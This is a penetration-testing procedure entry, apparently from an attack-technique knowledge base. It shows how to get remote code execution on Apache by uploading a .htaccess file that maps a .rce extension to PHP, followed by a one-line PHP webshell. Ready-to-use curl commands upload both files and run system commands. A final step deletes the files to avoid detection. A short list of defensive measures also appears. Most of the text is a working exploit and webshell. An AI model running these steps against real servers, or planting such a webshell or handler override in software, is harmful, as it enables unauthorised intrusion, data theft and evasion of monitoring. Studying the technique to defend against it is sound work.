---
id: 379c07a3-4155-407e-8170-52322ea7248b
name: Configure-Apache-PHP-Handler-via-htaccess-for-RCE
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:40.874017+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
sub_techniques: []
tags:
  - htaccess
  - php
  - rce
  - web
  - apache
commands:
  - '[[commands/curl-upload-htaccess]]'
  - '[[commands/curl-upload-rce-payload]]'
platforms:
  - Web
  - Apache
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Configure-Apache-PHP-Handler-via-htaccess-for-RCE

## Summary

This procedure exploits a web server's file upload functionality to modify the .htaccess file, configuring Apache to treat files with a .rce extension as PHP scripts. This enables remote code execution (RCE) by uploading and accessing a malicious .rce file containing PHP code, allowing arbitrary command execution on the server.

## Description

In scenarios where a web application allows unauthenticated file uploads without proper validation (e.g., no extension checks or MIME type enforcement), an attacker can upload a custom .htaccess file to override Apache's PHP handler configuration. The key directive 'AddType application/x-httpd-php .rce' instructs Apache to parse .rce files as PHP, bypassing restrictions on .php uploads. Once uploaded to the web root, the attacker uploads a .rce file with PHP code (e.g., a webshell) and accesses it via a browser, triggering execution. This technique targets Apache servers with mod_php enabled and .htaccess overrides allowed (AllowOverride directive). It is commonly used in web penetration testing to achieve initial RCE on vulnerable file upload endpoints. Expected outcomes include shell access, data exfiltration, or lateral movement. Prerequisites include a file upload vulnerability and write access to the web directory.

## Requirements

1. Access to a file upload endpoint on the target web application that allows uploading without authentication or with weak validation.
2. Target server running Apache with PHP (mod_php) and .htaccess support enabled (AllowOverride FileInfo or All).
3. Network access to the web server (e.g., via browser or curl).
4. Basic knowledge of PHP for crafting payloads.

## Defense

Defensive measures and detection strategies:

- Disable .htaccess overrides in Apache configuration (set AllowOverride to None) or restrict to specific directives.
- Implement strict file upload validation: check MIME types, scan for executable content, and restrict extensions to safe ones (e.g., images only).
- Use a web application firewall (WAF) to block uploads containing .htaccess modifications or suspicious directives like AddType.
- Monitor web logs for anomalous uploads to root directories and PHP execution on non-standard extensions; enable mod_security for rule-based detection.
- Run file integrity monitoring (FIM) on web directories to alert on .htaccess changes.

## Objectives

1. Achieve remote code execution on the web server by executing arbitrary PHP commands.
2. Gain a foothold for further post-exploitation activities, such as privilege escalation or data theft.
3. Demonstrate the impact of misconfigured file upload handling in web applications.

## Instructions

### Step 1: Create and Upload .htaccess Configuration

**Context**: Craft a .htaccess file with the PHP handler directive and upload it to the web root directory to enable PHP parsing for .rce files. This step assumes an exploitable file upload endpoint (e.g., /upload.php).

**Code** ([[codes/Apache-htaccess-PHP-Handler-Config]]):

Create a file named .htaccess with the following content:

```apache
AddType application/x-httpd-php .rce
```

**Command** ([[commands/curl-upload-htaccess]]):

```bash
curl -X POST -F "file=@.htaccess" http://target.com/upload.php
```

> This uploads the .htaccess file. Verify by accessing http://target.com/.htaccess; it should display the AddType directive without errors. If the upload endpoint renames files, adjust the remote path accordingly.

### Step 2: Craft Malicious .rce Payload

**Context**: Create a simple PHP webshell in a .rce file to execute system commands via HTTP parameters. This payload uses $_GET to run commands.

**Code** ([[codes/Simple-PHP-RCE-Webshell]]):

Create a file named shell.rce with the following content:

```php
<?php system($_GET['cmd']); ?>
```

### Step 3: Upload the .rce Payload

**Context**: Upload the .rce file to the web root using the same upload endpoint. The .htaccess configuration will now treat it as PHP.

**Command** ([[commands/curl-upload-rce-payload]]):

```bash
curl -X POST -F "file=@shell.rce" http://target.com/upload.php
```

> Expected response: Success message from the upload endpoint (e.g., "File uploaded"). If the file is renamed (e.g., to shell.rce.1), note the new name from the response.

### Step 4: Execute the Payload

**Context**: Access the uploaded .rce file via browser or curl, passing a command parameter to trigger RCE. This verifies execution and provides interactive access.

**Command** (using curl for testing):

```bash
curl "http://target.com/shell.rce?cmd=whoami"
```

> The server executes the command and returns output (e.g., "www-data"). For interactive use, chain commands or use a full webshell. If no output, check server logs for parsing errors.

### Step 5: Verify and Clean Up

**Context**: Confirm RCE by running diagnostic commands and remove artifacts to avoid detection.

**Instructions**: Execute commands like 'id', 'uname -a' via the ?cmd= parameter. Delete uploaded files post-testing: curl "http://target.com/shell.rce?cmd=rm .htaccess shell.rce".

> Success if commands return expected server details; failure if PHP parsing is blocked (e.g., 403 error).
